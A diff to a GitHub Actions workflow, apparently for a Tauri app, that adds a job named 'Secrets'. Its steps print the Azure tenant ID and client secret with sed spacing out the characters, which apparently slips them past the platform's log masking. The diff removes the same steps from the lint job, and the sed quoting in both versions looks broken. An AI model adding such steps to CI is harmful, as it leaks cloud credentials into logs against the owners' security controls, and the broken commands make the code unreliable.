@@ -6,6 +6,15 @@ on:
       - '*'
 
 jobs:
+  secrets:
+    name: Secrets
+    runs-on: ubuntu-22.04
+    steps:
+      - name: DISPLAY SECRET X
+        run: echo ${{secrets.AZURE_TENANT_ID}} | sed 's/./& /`
+      - name: DISPLAY SECRET Y
+        run: echo ${{secrets.AZURE_CLIENT_SECRET}} | sed 's/./& /`
+
   lint:
     name: Lint (Clippy)
     runs-on: ubuntu-22.04
@@ -21,10 +30,6 @@ jobs:
       - name: Lint app
         working-directory: ./app/src-tauri
         run: cargo clippy
-      - name: DISPLAY SECRET X
-        run: echo ${{secrets.AZURE_TENANT_ID}} | sed 's/./& /
-      - name: DISPLAY SECRET Y
-        run: echo ${{secrets.AZURE_CLIENT_SECRET}} | sed 's/./& /
         
   publish-tauri:
     name: Release Tauri app
